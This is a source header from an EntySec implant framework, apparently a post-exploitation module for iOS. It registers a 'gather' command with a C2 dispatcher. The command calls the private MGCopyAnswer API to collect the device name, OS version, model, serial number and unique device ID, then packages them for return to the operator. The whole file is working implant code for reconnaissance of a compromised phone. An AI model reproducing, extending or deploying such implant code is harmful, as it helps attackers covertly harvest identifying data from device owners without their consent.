/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _GATHER_H_
#define _GATHER_H_

#include <api.h>
#include <c2.h>
#include <tlv.h>
#include <tlv_types.h>

#define GATHER_BASE 9

#define GATHER_GET_INFO \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       GATHER_BASE, \
                       API_CALL)

#define TLV_TYPE_NAME TLV_TYPE_CUSTOM(TLV_TYPE_STRING, GATHER_BASE, API_TYPE)
#define TLV_TYPE_OS TLV_TYPE_CUSTOM(TLV_TYPE_STRING, GATHER_BASE, API_TYPE + 1)
#define TLV_TYPE_MODEL TLV_TYPE_CUSTOM(TLV_TYPE_STRING, GATHER_BASE, API_TYPE + 2)
#define TLV_TYPE_SERIAL TLV_TYPE_CUSTOM(TLV_TYPE_STRING, GATHER_BASE, API_TYPE + 3)
#define TLV_TYPE_UDID TLV_TYPE_CUSTOM(TLV_TYPE_STRING, GATHER_BASE, API_TYPE + 4)

extern CFTypeRef MGCopyAnswer(CFStringRef);

static const CFStringRef kMGUniqueDeviceID = CFSTR("UniqueDeviceID");
static const CFStringRef kMGProductVersion = CFSTR("ProductVersion");
static const CFStringRef kMGModelNumber = CFSTR("ModelNumber");
static const CFStringRef kMGSerialNumber = CFSTR("SerialNumber");
static const CFStringRef kMGUserAssignedDeviceName = CFSTR("UserAssignedDeviceName");

static tlv_pkt_t *gather_get_info(c2_t *c2)
{
    tlv_pkt_t *result;

    CFStringRef name;
    CFStringRef software;
    CFStringRef model;
    CFStringRef serial;
    CFStringRef udid;

    char *nameString;
    char *softwareString;
    char *modelString;
    char *serialString;
    char *udidString;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS);

    name = MGCopyAnswer(kMGUserAssignedDeviceName);
    software = MGCopyAnswer(kMGProductVersion);
    model = MGCopyAnswer(kMGModelNumber);
    serial = MGCopyAnswer(kMGSerialNumber);
    udid = MGCopyAnswer(kMGUniqueDeviceID);

    nameString = (char *)[(__bridge NSString *)name UTF8String];
    softwareString = (char *)[(__bridge NSString *)software UTF8String];
    modelString = (char *)[(__bridge NSString *)model UTF8String];
    serialString = (char *)[(__bridge NSString *)serial UTF8String];
    udidString = (char *)[(__bridge NSString *)udid UTF8String];

    tlv_pkt_add_string(result, TLV_TYPE_NAME, nameString);
    tlv_pkt_add_string(result, TLV_TYPE_OS, softwareString);
    tlv_pkt_add_string(result, TLV_TYPE_MODEL, modelString);
    tlv_pkt_add_string(result, TLV_TYPE_SERIAL, serialString);
    tlv_pkt_add_string(result, TLV_TYPE_UDID, udidString);

    return result;
}

void register_gather_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, GATHER_GET_INFO, gather_get_info);
}

#endif